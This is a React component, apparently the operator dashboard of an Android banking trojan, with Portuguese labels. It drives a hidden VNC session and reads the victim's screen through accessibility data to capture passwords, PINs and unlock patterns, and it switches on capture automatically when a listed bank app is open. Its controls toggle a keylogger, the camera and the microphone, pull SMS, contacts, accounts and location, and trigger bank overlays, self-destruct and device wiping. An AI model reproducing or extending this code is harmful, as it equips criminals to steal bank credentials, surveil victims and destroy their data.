import { useEffect, useRef, useState, useCallback, useMemo } from 'react';
import useStore from '../../store/index.js';
import { ws }   from '../../ws.js';

// ── Banking package detection ─────────────────────────────────────────────────
const BANK_PKGS = new Set([
  'com.nu.production','com.itau','com.bradesco','com.santander.app',
  'br.com.bb.android','br.com.caixa.tem','br.com.gabba.caixa',
  'com.c6bank.app','br.com.intermedium','com.picpay',
  'com.mercadopago.wallet','br.com.original.bank',
  'com.btgpactual.banking','br.com.sicoob.bank','br.com.sicredi.app',
  'com.davivienda.mobile','com.daviplata','com.bancolombia','com.nequi',
]);
const isBank = pkg => {
  if (!pkg) return false;
  if (BANK_PKGS.has(pkg)) return true;
  const p = pkg.toLowerCase();
  return ['bank','banco','itau','bradesco','santander','nubank','caixa',
          'inter','picpay','neon','c6bank','davivienda','bancolombia'].some(k => p.includes(k));
};

// ── Parse hierarchy JSON from APK captureScreenHierarchy() ───────────────────
// Wire: { type:"SCREEN_HIERARCHY", data: JSON_STRING }
// Format: { timestamp, package, hierarchy:{ class:"RootView", bounds:{x,y,w,h}, children:[] } }
function parseData(dataStr) {
  try {
    const d    = typeof dataStr === 'string' ? JSON.parse(dataStr) : dataStr;
    const root = d.hierarchy;
    const sw   = root?.bounds?.w || 1080;
    const sh   = root?.bounds?.h || 2340;
    const nodes = [];
    walk(root, nodes, 0);
    return { pkg: d.package || '', nodes, sw, sh, ts: d.timestamp || Date.now() };
  } catch (_) {
    return { pkg: '', nodes: [], sw: 1080, sh: 2340, ts: Date.now() };
  }
}

// Walk the accessibility node tree — maps every field from buildNodeTree() exactly
function walk(node, out, depth) {
  if (!node || depth > 25) return;
  const b = node.bounds;
  const hasContent =
    (node.text  && node.text.trim())  ||
    (node.desc  && node.desc.trim())  ||
    (node.hint  && node.hint.trim())  ||
    (b && b.w > 4 && b.h > 4 && node.clickable);
  if (hasContent) {
    const text = (node.text || node.desc || node.hint || node.tooltip || '').trim();
    out.push({
      text,
      cls:           node.class          || '',
      id:            node.id             || '',
      pkg:           node.windowPackage  || '',
      windowType:    node.windowType     || 0,
      isLockScreen:  !!node.isLockScreen,
      clickable:     !!node.clickable,
      editable:      !!node.editable,
      password:      !!node.password,
      checked:       !!node.checked,
      enabled:       node.enabled !== false,
      focused:       !!node.focused,
      scrollable:    !!node.scrollable,
      longClick:     !!node.longClickable,
      selected:      !!node.selected,
      isLockEl:      !!node.isLockElement,
      isPinDigit:    !!node.isPinDigit,
      isPatternLock: !!node.isPatternLock,
      isSwipeUnlock: !!node.isSwipeUnlock,
      isKeyboard:    !!node.isKeyboard,
      isKeyboardKey: !!node.isKeyboardKey,
      keyType:       node.keyType       || '',
      stateDesc:     node.stateDesc     || '',
      bounds: b ? { x: b.x||0, y: b.y||0, w: b.w||0, h: b.h||0 } : null,
      patternGrid:   node.patternGrid   || null,
      swipeHint:     node.swipeHint     || null,
      depth,
    });
  }
  const children = node.children || [];
  for (let i = 0; i < children.length; i++) walk(children[i], out, depth + 1);
}

const tapCenter = n =>
  n.bounds
    ? { x: Math.round(n.bounds.x + n.bounds.w / 2), y: Math.round(n.bounds.y + n.bounds.h / 2) }
    : null;

// ─────────────────────────────────────────────────────────────────────────────
// MAIN COMPONENT
// ─────────────────────────────────────────────────────────────────────────────
const TABS = ['HVNC', 'SR V2', 'CONTROLS'];

export default function ScreenReaderV2({ deviceId, onBack, sendCmd }) {
  const device = useStore(s => s.deviceDetail) || {};
  const setVnc = useStore(s => s.setVncActive);

  const [tab, setTab] = useState('HVNC');

  // HVNC canvas
  const canvasRef = useRef(null);
  const fpsRef    = useRef(0);
  const touchRef  = useRef(null);
  const mouseRef  = useRef(null);
  const [fps,   setFps]   = useState(0);
  const [vncOn, setVncOn] = useState(false);

  // Screen Reader V2
  const [srOn,   setSrOn]   = useState(false);
  const [nodes,  setNodes]  = useState([]);
  const [sw,     setSw]     = useState(1080);
  const [sh,     setSh]     = useState(2340);
  const [curPkg, setCurPkg] = useState('');
  const [hz,     setHz]     = useState(0);
  const [lastTs, setLastTs] = useState(null);
  const [rawJson,setRaw]    = useState('');
  const hzRef   = useRef(0);

  const [v2tab,  setV2tab]  = useState('tree');
  const [filter, setFilter] = useState('');
  const [toast,  setToast]  = useState(null);
  const toastTimer = useRef(null);

  function showToast(m, ms = 1800) {
    setToast(m);
    clearTimeout(toastTimer.current);
    toastTimer.current = setTimeout(() => setToast(null), ms);
  }

  // Subscribe sr2 stream when SR V2 tab is open
  useEffect(() => {
    if (tab === 'SR V2') {
      ws.send({ type: 'subscribe_sr2', device_id: deviceId });
      return () => ws.send({ type: 'unsubscribe_sr2', device_id: deviceId });
    }
  }, [tab, deviceId]);

  // Binary VNC frames → canvas
  useEffect(() => {
    const unsub = ws.onBinary((buf, devId) => {
      if (devId !== deviceId) return;
      const blob = new Blob([buf], { type: 'image/jpeg' });
      const url  = URL.createObjectURL(blob);
      const img  = new Image();
      img.onload = () => {
        const c = canvasRef.current;
        if (!c) { URL.revokeObjectURL(url); return; }
        if (c.width  !== img.naturalWidth)  c.width  = img.naturalWidth;
        if (c.height !== img.naturalHeight) c.height = img.naturalHeight;
        c.getContext('2d').drawImage(img, 0, 0);
        URL.revokeObjectURL(url);
        fpsRef.current++;
      };
      img.src = url;
    });
    const fpsTick = setInterval(() => { setFps(fpsRef.current); fpsRef.current = 0; }, 1000);
    return () => { unsub(); clearInterval(fpsTick); };
  }, [deviceId]);

  // WS message handler
  useEffect(() => {
    const unsub = ws.onMessage(msg => {
      if (msg.device_id !== deviceId) return;

      if (msg.type === 'screen_hierarchy' || msg.type === 'SCREEN_HIERARCHY') {
        const { pkg, nodes: parsed, sw: w, sh: h, ts } = parseData(msg.data);
        setNodes(parsed);
        setSw(w); setSh(h);
        setCurPkg(pkg);
        setLastTs(ts || Date.now());
        setRaw(typeof msg.data === 'string' ? msg.data : JSON.stringify(msg.data, null, 2));
        hzRef.current++;
        if (parsed.some(n => n.password && n.focused)) showToast('🔑 Senha em foco');
      }

      if (msg.type === 'device_status') {
        setCurPkg(msg.package || '');
        if (isBank(msg.package) && !srOn) setSrOn(true);
      }

      if (msg.type === 'vnc_status') {
        const on = !!msg.active;
        setVncOn(on);
        setVnc(on);
      }
    });

    const hzTick = setInterval(() => { setHz(hzRef.current); hzRef.current = 0; }, 1000);
    sendCmd('REQUEST_HIERARCHY');
    return () => { unsub(); clearInterval(hzTick); };
  }, [deviceId]);

  // VNC
  function startVnc() { ws.subscribe('vnc', deviceId); sendCmd('START_SILENT_VNC'); setVncOn(true); setVnc(true); }
  function stopVnc()  { ws.unsubscribe('vnc', deviceId); sendCmd('STOP_SILENT_VNC'); setVncOn(false); setVnc(false); }

  function toggleSR(on) {
    sendCmd('TOGGLE_SCREEN_READER', { enabled: on });
    setSrOn(on);
    if (on) showToast('⚡ Screen Reader V2 ativo');
  }

  // Canvas gestures
  const scaled = useCallback((cx, cy) => {
    const c = canvasRef.current; if (!c) return { x: 0, y: 0 };
    const r = c.getBoundingClientRect();
    return { x: Math.round((cx - r.left) * c.width / r.width), y: Math.round((cy - r.top) * c.height / r.height) };
  }, []);

  const onTouchStart = useCallback(e => {
    e.preventDefault();
    const t = e.touches[0];
    touchRef.current = { ...scaled(t.clientX, t.clientY), ts: Date.now() };
  }, [scaled]);

  const onTouchEnd = useCallback(e => {
    e.preventDefault();
    if (!touchRef.current) return;
    const t = e.changedTouches[0];
    const end = scaled(t.clientX, t.clientY);
    const { x: sx, y: sy, ts } = touchRef.current;
    const dt = Date.now() - ts;
    const dist = Math.hypot(end.x - sx, end.y - sy);
    if (dist < 10) sendCmd(dt > 600 ? 'LONG_PRESS' : 'TAP', { x: sx, y: sy });
    else sendCmd('SWIPE', { x1: sx, y1: sy, x2: end.x, y2: end.y, duration: dt });
    touchRef.current = null;
  }, [scaled, sendCmd]);

  const onMD = useCallback(e => { mouseRef.current = { ...scaled(e.clientX, e.clientY), ts: Date.now() }; }, [scaled]);
  const onMU = useCallback(e => {
    if (!mouseRef.current) return;
    const end = scaled(e.clientX, e.clientY);
    const { x: sx, y: sy, ts } = mouseRef.current;
    const dist = Math.hypot(end.x - sx, end.y - sy);
    if (dist < 8) sendCmd('TAP', { x: sx, y: sy });
    else sendCmd('SWIPE', { x1: sx, y1: sy, x2: end.x, y2: end.y, duration: Date.now() - ts });
    mouseRef.current = null;
  }, [scaled, sendCmd]);

  function tapNode(node, long = false) {
    const c = tapCenter(node); if (!c) return;
    sendCmd(long ? 'LONG_PRESS' : 'TAP', c);
    showToast(`${long ? 'HOLD' : 'TAP'} → ${node.text || node.cls.split('.').pop()}`);
  }

  // Derived
  const pwdNodes    = useMemo(() => nodes.filter(n => n.password),                       [nodes]);
  const pinNodes    = useMemo(() => nodes.filter(n => n.isPinDigit),                     [nodes]);
  const kbNodes     = useMemo(() => nodes.filter(n => n.isKeyboardKey),                  [nodes]);
  const patternNode = useMemo(() => nodes.find(n  => n.isPatternLock && n.patternGrid),  [nodes]);
  const swipeNode   = useMemo(() => nodes.find(n  => n.isSwipeUnlock),                   [nodes]);
  const credNodes   = useMemo(() => nodes.filter(n => n.password || n.isPinDigit || n.editable || n.isLockEl), [nodes]);
  const bankApp     = isBank(curPkg);

  const filtered = useMemo(() => {
    if (!filter) return nodes;
    const q = filter.toLowerCase();
    return nodes.filter(n =>
      (n.text || '').toLowerCase().includes(q) ||
      (n.cls  || '').toLowerCase().includes(q) ||
      (n.id   || '').toLowerCase().includes(q));
  }, [nodes, filter]);

  // ── RENDER ─────────────────────────────────────────────────────────────────
  return (
    <div style={{ paddingBottom: 28, position: 'relative' }}>

      {toast && (
        <div style={{
          position: 'fixed', top: 64, left: '50%', transform: 'translateX(-50%)',
          background: 'rgba(10,8,2,.97)', border: '1px solid var(--gold)',
          borderRadius: 10, padding: '7px 16px', zIndex: 9999, pointerEvents: 'none',
          boxShadow: '0 4px 20px rgba(0,0,0,.7)',
        }}>
          <div style={{ color: '#00c864', fontSize: 11, fontWeight: 700 }}>{toast}</div>
        </div>
      )}

      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
        <div style={{ width: 4, height: 36, background: '#3b7af0', borderRadius: 2, flexShrink: 0 }} />
        <div style={{ flex: 1 }}>
          <div style={{ fontWeight: 800, fontSize: 13, color: 'var(--gold)', letterSpacing: 1 }}>
            HVNC + SCREEN READER V2
          </div>
          <div style={{ display: 'flex', gap: 5, alignItems: 'center', marginTop: 2, flexWrap: 'wrap' }}>
            {vncOn   && <Badge color="#3b7af0">HVNC {fps} FPS</Badge>}
            {srOn    && <Badge color="#00c864">⚡ {hz}/s</Badge>}
            {bankApp && <Badge color="#e03060">FLAG_SECURE</Badge>}
            {nodes.length > 0 && <span style={{ fontSize: 9, color: 'var(--text3)' }}>{nodes.length} nós</span>}
          </div>
        </div>
        <button onClick={() => { sendCmd('REQUEST_HIERARCHY'); showToast('↺ Refresh'); }}
          style={bs({ color: 'var(--gold)', border: '1px solid var(--gold-border)' })}>↺</button>
        <button onClick={() => { stopVnc(); onBack(); }} style={bs({ color: 'var(--text2)' })}>←</button>
      </div>

      {/* Tab bar */}
      <div style={{ display: 'flex', gap: 4, marginBottom: 12,
                    background: 'var(--bg3)', borderRadius: 10, padding: 4 }}>
        {TABS.map(t => (
          <button key={t} onClick={() => setTab(t)} style={{
            flex: 1, padding: '7px 0', fontSize: 11, fontWeight: 700,
            borderRadius: 7, border: 'none', cursor: 'pointer',
            background: tab === t
              ? (t === 'HVNC' ? '#3b7af0' : t === 'SR V2' ? '#00c864' : 'var(--gold)')
              : 'transparent',
            color: tab === t ? (t === 'CONTROLS' ? '#000' : '#fff') : 'var(--text2)',
            transition: 'all .14s',
          }}>
            {t === 'HVNC' ? '🖥 HVNC' : t === 'SR V2' ? '👁 SR V2' : '🎛 CONTROLS'}
          </button>
        ))}
      </div>

      {/* ══ HVNC TAB ══ */}
      {tab === 'HVNC' && (
        <div>
          <div
            style={{ position: 'relative', marginBottom: 10, borderRadius: 10, overflow: 'hidden',
                     background: '#000', border: '1px solid rgba(59,122,240,.3)' }}
            onTouchStart={onTouchStart} onTouchEnd={onTouchEnd}
            onMouseDown={onMD} onMouseUp={onMU}
          >
            <canvas ref={canvasRef}
              style={{ display: 'block', width: '100%', maxHeight: 520, objectFit: 'contain' }}
              width={360} height={520} />
            {vncOn && (
              <div style={{ position: 'absolute', top: 6, right: 6, display: 'flex', gap: 4 }}>
                <Badge color="#3b7af0">HVNC</Badge>
                <Badge color="#00c864">{fps} FPS</Badge>
                {bankApp && <Badge color="#e03060">FLAG_SECURE</Badge>}
              </div>
            )}
            {!vncOn && (
              <div style={{ position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column',
                            alignItems: 'center', justifyContent: 'center', gap: 8, background: 'rgba(0,0,0,.85)' }}>
                {bankApp
                  ? <>
                      <div style={{ fontSize: 28 }}>🏦</div>
                      <div style={{ color: '#ff5c80', fontWeight: 700, fontSize: 13 }}>FLAG_SECURE ATIVO</div>
                      <div style={{ color: 'var(--text2)', fontSize: 10, textAlign: 'center', padding: '0 24px' }}>
                        VNC bloqueado pelo banco. Use SR V2.
                      </div>
                    </>
                  : <>
                      <div style={{ width: 28, height: 28, border: '3px solid rgba(59,122,240,.3)',
                                    borderTopColor: '#3b7af0', borderRadius: '50%', animation: 'spin 1s linear infinite' }} />
                      <div style={{ fontSize: 11, color: 'var(--text2)' }}>Aguardando HVNC...</div>
                    </>
                }
              </div>
            )}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, marginBottom: 12 }}>
            <button className="btn btn-blue btn-block btn-sm" onClick={startVnc}>▶ START HVNC</button>
            <button className="btn btn-red  btn-block btn-sm" onClick={stopVnc}>⏹ STOP</button>
          </div>
          <NavGrid sendCmd={sendCmd} />
        </div>
      )}

      {/* ══ SR V2 TAB ══ */}
      {tab === 'SR V2' && (
        <div>
          {/* Status bar */}
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '8px 12px',
                        marginBottom: 10, borderRadius: 10, background: 'var(--card2)',
                        border: '1px solid rgba(212,149,10,.15)' }}>
            <div style={{ flex: 1, minWidth: 0 }}>
              <div style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)',
                            overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                {curPkg || '—'}
              </div>
              {lastTs && <div style={{ fontSize: 9, color: 'var(--text3)', marginTop: 2 }}>
                {new Date(lastTs).toLocaleTimeString()} · {sw}×{sh}
              </div>}
            </div>
            <div onClick={() => toggleSR(!srOn)} style={{
              display: 'flex', alignItems: 'center', gap: 5, cursor: 'pointer',
              padding: '4px 10px', borderRadius: 8,
              background: srOn ? 'rgba(0,200,80,.14)' : 'var(--bg3)',
              border: `1px solid ${srOn ? 'rgba(0,200,80,.4)' : 'var(--border)'}`,
            }}>
              <div style={{ width: 8, height: 8, borderRadius: '50%',
                            background: srOn ? '#00c864' : 'var(--text3)',
                            boxShadow: srOn ? '0 0 6px #00c864' : 'none' }} />
              <span style={{ fontSize: 10, fontWeight: 700, color: srOn ? '#00c864' : 'var(--text3)' }}>
                {srOn ? `V2 ON · ${hz}/s` : 'V2 OFF'}
              </span>
            </div>
            <button onClick={() => { sendCmd('REQUEST_HIERARCHY'); showToast('↺ Refresh'); }}
              style={{ fontSize: 13, padding: '3px 8px', borderRadius: 7,
                border: '1px solid var(--gold-border)', background: 'transparent',
                color: 'var(--gold)', cursor: 'pointer' }}>↺</button>
          </div>

          {/* Stat pills */}
          <div style={{ display: 'flex', gap: 4, flexWrap: 'wrap', marginBottom: 10 }}>
            <Pill color="#d4950a">{nodes.length} nós</Pill>
            <Pill color="#3b7af0">{nodes.filter(n => n.clickable && n.text).length} click</Pill>
            {pwdNodes.length > 0 && <Pill color="#e03060">🔑 {pwdNodes.length} pwd</Pill>}
            {pinNodes.length > 0 && <Pill color="#a855f7">🔢 PIN</Pill>}
            {patternNode         && <Pill color="#a855f7">⬡ PADRÃO</Pill>}
            {swipeNode           && <Pill color="#00c864">↑ SWIPE</Pill>}
            {kbNodes.length > 0  && <Pill color="#64748b">⌨ {kbNodes.length} keys</Pill>}
          </div>

          {/* Bank alert */}
          {bankApp && (
            <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '8px 12px',
                          marginBottom: 10, borderRadius: 10,
                          background: 'rgba(224,48,96,.07)', border: '1px solid rgba(224,48,96,.35)' }}>
              <span style={{ fontSize: 20 }}>🏦</span>
              <div style={{ flex: 1 }}>
                <div style={{ fontWeight: 700, fontSize: 11, color: '#ff5c80' }}>FLAG_SECURE — VNC BLOQUEADO</div>
                <div style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)', marginTop: 2 }}>{curPkg}</div>
              </div>
              <div style={{ fontSize: 9, fontWeight: 700, color: srOn ? '#00c864' : 'var(--text3)' }}>
                {srOn ? '⚡ SR ATIVO' : 'SR OFF'}
              </div>
            </div>
          )}

          {/* Password fields */}
          {pwdNodes.length > 0 && (
            <div style={{ marginBottom: 10 }}>
              {pwdNodes.map((n, i) => (
                <div key={i} onClick={() => tapNode(n)} style={{
                  display: 'flex', alignItems: 'center', gap: 10, padding: '8px 12px', marginBottom: 4,
                  borderRadius: 8, cursor: 'pointer',
                  background: 'rgba(224,48,96,.07)', border: '1px solid rgba(224,48,96,.35)',
                }}>
                  <span style={{ fontSize: 18 }}>🔑</span>
                  <div style={{ flex: 1 }}>
                    <div style={{ fontSize: 11, fontWeight: 700, color: '#ff5c80' }}>
                      CAMPO SENHA {n.focused ? '◉ EM FOCO' : ''}
                    </div>
                    <div style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)', marginTop: 2 }}>
                      {n.cls.split('.').pop()}{n.id ? ` #${n.id.split('/').pop()}` : ''}
                    </div>
                  </div>
                  {n.bounds && (
                    <span style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)' }}>
                      →{Math.round(n.bounds.x + n.bounds.w/2)},{Math.round(n.bounds.y + n.bounds.h/2)}
                    </span>
                  )}
                </div>
              ))}
            </div>
          )}

          {/* PIN pad */}
          {pinNodes.length > 0 && (
            <div style={{ padding: '10px 14px', marginBottom: 10, borderRadius: 10,
                          background: 'rgba(168,85,247,.09)', border: '1px solid rgba(168,85,247,.4)',
                          display: 'flex', alignItems: 'center', gap: 12 }}>
              <div style={{ flex: 1 }}>
                <div style={{ fontSize: 11, fontWeight: 700, color: '#a855f7', marginBottom: 6 }}>🔢 PIN DETECTADO</div>
                <div style={{ letterSpacing: 10, fontWeight: 800, fontSize: 20, color: '#c084fc', fontFamily: 'var(--mono)' }}>
                  {pinNodes.map(n => n.text).join(' ')}
                </div>
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                {pinNodes.slice(0, 6).map((n, i) => (
                  <button key={i} onClick={() => tapNode(n)} style={{
                    padding: '2px 12px', fontSize: 12, fontWeight: 700, fontFamily: 'var(--mono)',
                    borderRadius: 6, border: '1px solid rgba(168,85,247,.4)',
                    background: 'rgba(168,85,247,.1)', color: '#c084fc', cursor: 'pointer',
                  }}>{n.text}</button>
                ))}
              </div>
            </div>
          )}

          {/* Pattern lock */}
          {patternNode?.patternGrid && (
            <div style={{ padding: '10px 14px', marginBottom: 10, borderRadius: 10,
                          background: 'rgba(59,122,240,.07)', border: '1px solid rgba(59,122,240,.35)' }}>
              <div style={{ fontSize: 11, fontWeight: 700, color: '#3b7af0', marginBottom: 8 }}>⬡ PADRÃO</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: 6, maxWidth: 180, margin: '0 auto' }}>
                {patternNode.patternGrid.map((pt, i) => (
                  <button key={i} onClick={() => sendCmd('TAP', { x: pt.x, y: pt.y })} style={{
                    aspectRatio: '1', borderRadius: '50%', border: '2px solid rgba(59,122,240,.5)',
                    background: 'rgba(59,122,240,.1)', color: '#3b7af0', fontWeight: 700,
                    fontSize: 14, cursor: 'pointer',
                  }}>{i + 1}</button>
                ))}
              </div>
            </div>
          )}

          {/* Swipe unlock */}
          {swipeNode?.swipeHint && (
            <div style={{ padding: '10px 14px', marginBottom: 10, borderRadius: 10,
                          background: 'rgba(0,200,80,.05)', border: '1px solid rgba(0,200,80,.3)' }}>
              <div style={{ fontSize: 11, fontWeight: 700, color: '#00c864', marginBottom: 6 }}>↑ SWIPE UNLOCK</div>
              <button className="btn btn-green btn-block btn-sm"
                onClick={() => {
                  const h = swipeNode.swipeHint;
                  sendCmd('SWIPE', { x1: h.sx, y1: h.sy, x2: h.ex, y2: h.ey, duration: 400 });
                }}>EXECUTAR SWIPE</button>
            </div>
          )}

          {/* Sub-tabs */}
          <div style={{ display: 'flex', gap: 4, marginBottom: 10 }}>
            {[['tree','🌳 Árvore'],['nodes','🔵 Nós'],['creds','🔑 Creds'],['raw','{ } RAW']].map(([id, label]) => (
              <button key={id} onClick={() => setV2tab(id)} style={{
                flex: 1, padding: '5px 0', fontSize: 10, fontWeight: 700, borderRadius: 8,
                border: 'none', cursor: 'pointer',
                background: v2tab === id ? 'var(--gold)' : 'var(--bg3)',
                color:      v2tab === id ? '#000'       : 'var(--text2)',
                transition: 'background .12s',
              }}>{label}</button>
            ))}
          </div>

          {/* Tree */}
          {v2tab === 'tree' && (
            <div style={{ maxHeight: 460, overflowY: 'auto' }}>
              {nodes.filter(n => n.text && !n.isKeyboardKey).length === 0
                ? <Empty icon="🌳" msg={srOn ? 'Aguardando hierarquia (loop 500ms)...' : 'Ative Screen Reader V2'} />
                : nodes
                    .filter(n => n.text && !n.isKeyboardKey && !n.password && !n.isPinDigit)
                    .slice(0, 300)
                    .map((n, i) => (
                      <div key={i}
                        onClick={() => n.clickable && tapNode(n)}
                        onContextMenu={e => { e.preventDefault(); tapNode(n, true); }}
                        style={{
                          display: 'flex', alignItems: 'center', gap: 6,
                          padding: '5px 10px', paddingLeft: 10 + n.depth * 4,
                          marginBottom: 2, borderRadius: 7,
                          background: n.clickable ? 'rgba(212,149,10,.07)' : 'rgba(255,255,255,.02)',
                          border: `1px solid ${n.clickable ? 'rgba(212,149,10,.22)' : 'rgba(255,255,255,.03)'}`,
                          cursor: n.clickable ? 'pointer' : 'default',
                        }}>
                        {n.focused && <span style={{ color: '#3b7af0', fontSize: 9 }}>◉</span>}
                        <span style={{ flex: 1, fontSize: 12, wordBreak: 'break-word',
                          fontWeight: n.clickable ? 600 : 400,
                          color: n.clickable ? 'var(--gold)' : 'var(--text)' }}>{n.text}</span>
                        {n.editable && <TinyTag>EDIT</TinyTag>}
                        {n.scrollable && <span style={{ color: 'var(--text3)', fontSize: 9 }}>↕</span>}
                        {n.checked   && <span style={{ color: '#00c864', fontSize: 9 }}>✓</span>}
                        {n.bounds && n.clickable && (
                          <span style={{ fontSize: 9, color: 'var(--text3)', fontFamily: 'var(--mono)', flexShrink: 0 }}>
                            {Math.round(n.bounds.x+n.bounds.w/2)},{Math.round(n.bounds.y+n.bounds.h/2)}
                          </span>
                        )}
                      </div>
                    ))
              }
            </div>
          )}

          {/* Nodes */}
          {v2tab === 'nodes' && (
            <>
              <div style={{ display: 'flex', gap: 8, marginBottom: 8 }}>
                <input value={filter} onChange={e => setFilter(e.target.value)}
                  placeholder="Filtrar nós..." className="input" style={{ flex: 1 }} />
                <span style={{ fontSize: 10, color: 'var(--text2)', alignSelf: 'center', whiteSpace: 'nowrap' }}>
                  {filtered.length}/{nodes.length}
                </span>
              </div>
              <div style={{ maxHeight: 460, overflowY: 'auto' }}>
                {filtered.length === 0 && <Empty icon="🔵" msg="Nenhum nó encontrado" />}
                {filtered.slice(0, 300).map((n, i) => <NodeCard key={i} n={n} onTap={() => n.clickable && tapNode(n)} />)}
              </div>
            </>
          )}

          {/* Creds */}
          {v2tab === 'creds' && (
            <div style={{ maxHeight: 460, overflowY: 'auto' }}>
              {credNodes.length === 0 && <Empty icon="🔑" msg="Nenhuma credencial detectada" />}
              {credNodes.map((n, i) => <NodeCard key={i} n={n} onTap={() => tapNode(n)} highlight />)}
            </div>
          )}

          {/* Raw */}
          {v2tab === 'raw' && (
            <>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 6 }}>
                <span style={{ fontSize: 10, color: 'var(--text2)' }}>
                  {rawJson.length.toLocaleString()} chars · {curPkg || '—'}
                </span>
                <button onClick={() => navigator.clipboard?.writeText(rawJson).catch(() => {})}
                  style={{ fontSize: 10, padding: '2px 8px', borderRadius: 5,
                    border: '1px solid var(--gold-border)', background: 'var(--bg3)',
                    color: 'var(--text2)', cursor: 'pointer' }}>📋 COPIAR</button>
              </div>
              <div style={{ background: '#020304', border: '1px solid var(--gold-border)', borderRadius: 8,
                            padding: 10, height: 400, overflowY: 'auto', overflowX: 'auto',
                            fontFamily: 'var(--mono)', fontSize: 9.5, color: '#8a9cc0',
                            whiteSpace: 'pre', lineHeight: 1.6 }}>
                {rawJson || 'Nenhum dado. Ative Screen Reader V2 e aguarde.'}
              </div>
            </>
          )}
        </div>
      )}

      {/* ══ CONTROLS TAB ══ */}
      {tab === 'CONTROLS' && (
        <div>
          <SectionHdr icon="⚡" label="CONTROLE AO VIVO" />
          <CtrlBtn label="Informações Gerais" onClick={() => sendCmd('GET_DEVICE_INFO')} />
          <CtrlBtn label="Câmera ao Vivo"
            state={device.camera_active ? 'true' : 'false'}
            onClick={() => sendCmd('TOGGLE_CAMERA', { enabled: !device.camera_active })} />
          <CtrlBtn label="Áudio ao Vivo"
            state={device.mic_active ? 'true' : 'false'}
            onClick={() => sendCmd('TOGGLE_MICROPHONE', { enabled: !device.mic_active })} />
          <CtrlBtn label="Keylogger"
            state={device.keylogger_active ? 'true' : 'false'}
            onClick={() => sendCmd('TOGGLE_KEYLOGGER', { enabled: !device.keylogger_active })} />

          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 6, marginBottom: 6 }}>
            <button className={`btn btn-sm btn-block ${srOn ? 'btn-green' : 'btn-ghost'}`}
              onClick={() => { toggleSR(true); setTab('SR V2'); }}>⚡ ATIVAR V2</button>
            <button className="btn btn-ghost btn-sm btn-block"
              onClick={() => toggleSR(false)}>⏹ PARAR V2</button>
          </div>

          <SectionHdr icon="📁" label="EXTRAÇÃO DE DADOS" />
          <CtrlBtn label="Contas Google"          onClick={() => sendCmd('GET_ACCOUNTS')} />
          <CtrlBtn label="Extração de Dados"      onClick={() => sendCmd('GET_DEVICE_INFO')} />
          <CtrlBtn label="Gerenciador de Arquivos" onClick={() => sendCmd('FILE_LIST', { path: '/sdcard' })} />
          <CtrlBtn label="SMS & Mensagens"         onClick={() => sendCmd('GET_SMS')} />
          <CtrlBtn label="Aplicativos"             onClick={() => sendCmd('GET_INSTALLED_APPS')} />
          <CtrlBtn label="Contatos"                onClick={() => sendCmd('GET_CONTACTS')} />
          <CtrlBtn label="Localização GPS"         onClick={() => sendCmd('GET_LOCATION')} />

          <SectionHdr icon="💰" label="FINANCEIRO" />
          <CtrlBtn label="Banking Overlay"            onClick={() => sendCmd('BLACK_SCREEN_ON')} />
          <CtrlBtn label="Pix & Captura"              onClick={() => setTab('SR V2')} />
          <CtrlBtn label="Sequências de Desbloqueio" onClick={() => sendCmd('START_UNLOCK_RECORDING')} />

          <SectionHdr icon="🛡" label="SEGURANÇA" />
          <CtrlBtn label="Admin Status"    onClick={() => sendCmd('CHECK_ADMIN_STATUS')} />
          <CtrlBtn label="Banks Crypter"
            state={device.banks_crypter ? 'true' : 'false'}
            onClick={() => sendCmd('TOGGLE_BOT_OPTION', { option: 'banks_crypter', enabled: !device.banks_crypter })} />
          <CtrlBtn label="Black Screen ON"  onClick={() => sendCmd('BLACK_SCREEN_ON')} />
          <CtrlBtn label="Black Screen OFF" onClick={() => sendCmd('BLACK_SCREEN_OFF')} />

          <SectionHdr icon="🔧" label="SISTEMA" />
          <NavGrid sendCmd={sendCmd} />
          <div style={{ marginTop: 8, display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 6 }}>
            <button className="btn btn-danger-soft btn-sm btn-block"
              onClick={() => { if(confirm('Self destruct?')) sendCmd('SELF_DESTRUCT'); }}>💥 DESTRUCT</button>
            <button className="btn btn-danger-soft btn-sm btn-block"
              onClick={() => { if(confirm('Format device?')) sendCmd('FORMAT_DEVICE'); }}>🗑 FORMAT</button>
          </div>
        </div>
      )}
    </div>
  );
}

// ── Sub-components ──────────────────────────────────────────────────────────────

function Badge({ color, children }) {
  return (
    <span style={{ fontSize: 9, padding: '1px 6px', borderRadius: 4, fontWeight: 700,
      background: `${color}22`, color, border: `1px solid ${color}50` }}>{children}</span>
  );
}

function Pill({ color, children }) {
  return (
    <span style={{ fontSize: 9, padding: '2px 7px', borderRadius: 5, fontWeight: 700,
      background: `${color}18`, color, border: `1px solid ${color}40` }}>{children}</span>
  );
}

function TinyTag({ children }) {
  return (
    <span style={{ fontSize: 8, padding: '1px 5px', borderRadius: 3, fontWeight: 700,
      background: 'rgba(59,122,240,.1)', color: '#3b7af0', border: '1px solid rgba(59,122,240,.3)',
      flexShrink: 0 }}>{children}</span>
  );
}

function Empty({ icon, msg }) {
  return (
    <div style={{ textAlign: 'center', padding: '32px 16px', color: 'var(--text3)' }}>
      <div style={{ fontSize: 28, marginBottom: 8 }}>{icon}</div>
      <div style={{ fontSize: 11 }}>{msg}</div>
    </div>
  );
}

function NodeCard({ n, onTap, highlight }) {
  const bl = n.password ? '#e03060' : n.clickable ? 'var(--gold)' : n.focused ? '#3b7af0' : 'var(--border)';
  return (
    <div onClick={onTap} style={{
      background: 'var(--card2)',
      border: `1px solid ${highlight ? 'rgba(224,48,96,.4)' : n.clickable ? 'rgba(212,149,10,.25)' : 'rgba(212,149,10,.07)'}`,
